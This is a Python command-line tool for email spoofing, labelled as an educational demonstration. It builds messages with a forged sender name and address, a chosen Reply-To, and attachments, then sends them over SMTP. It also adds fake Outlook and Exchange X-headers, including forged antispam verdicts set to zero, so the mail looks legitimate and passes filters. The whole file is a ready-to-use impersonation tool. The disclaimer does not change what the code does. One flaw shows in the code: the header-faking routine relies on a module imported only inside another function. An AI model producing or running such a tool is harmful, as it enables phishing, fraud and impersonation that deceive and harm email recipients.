#!/usr/bin/env python3
"""
Advanced Email Spoofing Demonstration
This script demonstrates advanced email spoofing techniques for educational purposes only.
"""

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.mime.image import MIMEImage
from email.utils import formataddr, formatdate, make_msgid
import argparse
import sys
import os
import uuid
import socket
import random
from datetime import datetime

class EmailSpoofer:
    def __init__(self, smtp_server, smtp_port, username, password, debug_level=0):
        """
        Initialize EmailSpoofer with SMTP connection details
        
        Args:
            smtp_server (str): SMTP server address
            smtp_port (int): SMTP server port 
            username (str): SMTP authentication username
            password (str): SMTP authentication password
            debug_level (int): SMTP debug level (0-2)
        """
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password
        self.debug_level = debug_level
        
    def create_message(self, from_name, from_email, reply_to=None, 
                      to_email=None, cc=None, bcc=None, subject=None, 
                      message=None, html=True, attachments=None):
        """
        Create a message with spoofed headers
        
        Args:
            from_name (str): Display name for the spoofed sender
            from_email (str): Email address shown as the sender
            reply_to (str, optional): Reply-to email address
            to_email (str/list): Recipient email address or list of addresses
            cc (str/list, optional): CC email address or list of addresses
            bcc (str/list, optional): BCC email address or list of addresses
            subject (str, optional): Email subject
            message (str, optional): Email body content
            html (bool): If True, content is HTML; if False, plain text
            attachments (list, optional): List of file paths to attach
            
        Returns:
            MIMEMultipart: The email message object
        """
        # Create message container
        msg = MIMEMultipart('alternative')
        
        # Set basic headers
        msg['Message-ID'] = make_msgid(domain=from_email.split('@')[1])
        msg['Date'] = formatdate(localtime=True)
        msg['Subject'] = subject or ''
        msg['From'] = formataddr((from_name, from_email))
        
        # Handle recipients
        if to_email:
            if isinstance(to_email, list):
                msg['To'] = ', '.join(to_email)
            else:
                msg['To'] = to_email
                
        # Add CC if specified
        if cc:
            if isinstance(cc, list):
                msg['Cc'] = ', '.join(cc)
            else:
                msg['Cc'] = cc
                
        # Set Reply-To if specified
        if reply_to:
            msg['Reply-To'] = reply_to
            
        # Set content type based on html flag
        if message:
            if html:
                msg.attach(MIMEText(message, 'html'))
            else:
                msg.attach(MIMEText(message, 'plain'))
        
        # Add attachments if any
        if attachments:
            for attachment in attachments:
                if os.path.exists(attachment):
                    with open(attachment, 'rb') as f:
                        file_attachment = MIMEApplication(f.read())
                        
                    # Add header with filename
                    filename = os.path.basename(attachment)
                    file_attachment.add_header('Content-Disposition', 
                                             'attachment', 
                                             filename=filename)
                    msg.attach(file_attachment)
        
        return msg
    
    def add_custom_headers(self, msg, headers):
        """
        Add custom headers to email message
        
        Args:
            msg (MIMEMultipart): Email message object
            headers (dict): Dictionary of headers to add
            
        Returns:
            MIMEMultipart: Updated email message
        """
        for header, value in headers.items():
            msg[header] = value
            
        return msg
    
    def spoof_x_headers(self, msg, target_domain=None):
        """
        Add fake X-headers to make email look more legitimate
        
        Args:
            msg (MIMEMultipart): Email message object
            target_domain (str, optional): Domain to mimic
            
        Returns:
            MIMEMultipart: Updated email message
        """
        from_email = msg['From'].split('<')[1].split('>')[0]
        domain = target_domain or from_email.split('@')[1]
        
        # Add common X-headers seen in legitimate emails
        x_headers = {
            'X-Mailer': random.choice(['Outlook', 'Apple Mail', 'Gmail', 'Yahoo Mail']),
            'X-Originating-IP': f'[{socket.inet_ntoa(struct.pack("!L", random.randint(1, 0xffffffff)))}]',
            'X-Sender': from_email,
            'X-Priority': '3',
            'X-MSMail-Priority': 'Normal',
            'X-MimeOLE': f'Produced By Microsoft MimeOLE V6.{random.randint(0, 99)}.{random.randint(1000, 9999)}.{random.randint(0, 99)}',
            'X-Transport': f'{domain}.mail.protection.outlook.com',
            'X-Forefront-Antispam-Report': f'CIP:{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)};CTRY:US;LANG:en;',
            'X-MS-Exchange-Organization-SCL': '0',
            'X-MS-Exchange-Organization-PCL': '0',
            'X-MS-Exchange-Transport-CrossTenantHeadersStamped': domain,
            'X-Entity-ID': str(uuid.uuid4())
        }
        
        for header, value in x_headers.items():
            msg[header] = value
            
        return msg
    
    def send_email(self, msg, recipients):
        """
        Send the email message
        
        Args:
            msg (MIMEMultipart): Email message object
            recipients (list/str): List of recipient email addresses or single address
            
        Returns:
            bool: True if successful, False otherwise
        """
        if isinstance(recipients, str):
            recipient_list = [recipients]
        else:
            recipient_list = recipients
            
        try:
            # Connect to SMTP server
            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            server.set_debuglevel(self.debug_level)
            server.ehlo()
            server.starttls()
            server.ehlo()
            
            # Login to SMTP server
            server.login(self.username, self.password)
            
            # Send email
            server.sendmail(self.username, recipient_list, msg.as_string())
            server.quit()
            
            return True
            
        except Exception as e:
            print(f"[-] Error sending email: {e}")
            return False
            
def main():
    """Parse command line arguments and send spoofed email."""
    parser = argparse.ArgumentParser(description='Advanced Email Spoofing Tool')
    
    # SMTP Settings
    parser.add_argument('--server', required=True, help='SMTP server address')
    parser.add_argument('--port', type=int, default=587, help='SMTP server port (default: 587)')
    parser.add_argument('--user', required=True, help='SMTP username')
    parser.add_argument('--password', required=True, help='SMTP password')
    parser.add_argument('--debug', type=int, default=0, help='SMTP debug level (0-2)')
    
    # Spoofing Parameters
    parser.add_argument('--from-name', required=True, help='Spoofed sender name')
    parser.add_argument('--from-email', required=True, help='Spoofed sender email')
    parser.add_argument('--reply-to', help='Reply-to email address')
    parser.add_argument('--to', required=True, help='Recipient email(s), comma separated')
    parser.add_argument('--cc', help='CC recipient(s), comma separated')
    parser.add_argument('--bcc', help='BCC recipient(s), comma separated')
    parser.add_argument('--subject', default='', help='Email subject')
    parser.add_argument('--message', default='', help='Email message')
    parser.add_argument('--plain-text', action='store_true', help='Send as plain text instead of HTML')
    parser.add_argument('--attach', action='append', help='File(s) to attach (can be used multiple times)')
    parser.add_argument('--add-xheaders', action='store_true', help='Add fake X-headers to make email look more legitimate')
    parser.add_argument('--custom-header', action='append', help='Add custom header in format "Header:Value" (can be used multiple times)')
    
    args = parser.parse_args()
    
    print("[*] Advanced Email Spoofing Demonstration")
    print("[*] Note: This tool is for educational purposes only!")
    
    # Initialize spoofer
    spoofer = EmailSpoofer(
        args.server, 
        args.port, 
        args.user, 
        args.password,
        args.debug
    )
    
    # Parse recipients
    to_list = [email.strip() for email in args.to.split(',')] if args.to else None
    cc_list = [email.strip() for email in args.cc.split(',')] if args.cc else None
    bcc_list = [email.strip() for email in args.bcc.split(',')] if args.bcc else None
    
    # Create message
    msg = spoofer.create_message(
        args.from_name,
        args.from_email,
        args.reply_to,
        to_list,
        cc_list,
        None,  # BCC is handled differently, not in headers
        args.subject,
        args.message,
        not args.plain_text,
        args.attach
    )
    
    # Add custom headers if specified
    if args.custom_header:
        custom_headers = {}
        for header_str in args.custom_header:
            if ':' in header_str:
                key, value = header_str.split(':', 1)
                custom_headers[key.strip()] = value.strip()
        
        if custom_headers:
            msg = spoofer.add_custom_headers(msg, custom_headers)
    
    # Add fake X-headers if specified
    if args.add_xheaders:
        import struct  # Only import if needed
        msg = spoofer.spoof_x_headers(msg)
    
    # Get all recipients for sending
    all_recipients = []
    if to_list:
        all_recipients.extend(to_list)
    if cc_list:
        all_recipients.extend(cc_list)
    if bcc_list:
        all_recipients.extend(bcc_list)
    
    # Send email
    print(f"[*] Sending spoofed email from {args.from_name} <{args.from_email}>")
    print(f"[*] To: {', '.join(all_recipients)}")
    
    if spoofer.send_email(msg, all_recipients):
        print("[+] Email sent successfully!")
    else:
        print("[-] Failed to send email")

if __name__ == "__main__":
    print("=" * 70)
    print("           ADVANCED EMAIL SPOOFING DEMONSTRATION TOOL")
    print("                FOR EDUCATIONAL PURPOSES ONLY")
    print("=" * 70)
    
    main() 